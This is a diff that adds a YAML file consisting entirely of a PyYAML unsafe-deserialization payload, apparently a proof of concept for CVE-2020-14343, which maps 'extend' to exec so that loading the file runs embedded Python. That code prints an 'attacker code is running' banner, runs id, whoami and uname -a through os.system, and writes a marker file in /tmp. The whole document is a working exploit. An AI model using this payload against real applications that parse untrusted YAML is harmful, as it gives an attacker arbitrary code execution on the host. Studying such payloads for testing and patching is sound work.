@@ -1,0 +1,6 @@
+!!python/object/new:type
+args:
+- x
+- !!python/tuple []
+- extend: !!python/name:exec
+listitems: 'import os; print("=== ATTACKER CODE IS NOW RUNNING INSIDE THE TARGET ==="); os.system("id"); os.system("whoami"); os.system("uname -a"); open("/tmp/pwned_by_yaml.txt","w").write("RCE via CVE-2020-14343\n"); print("=== attacker wrote /tmp/pwned_by_yaml.txt ===")'
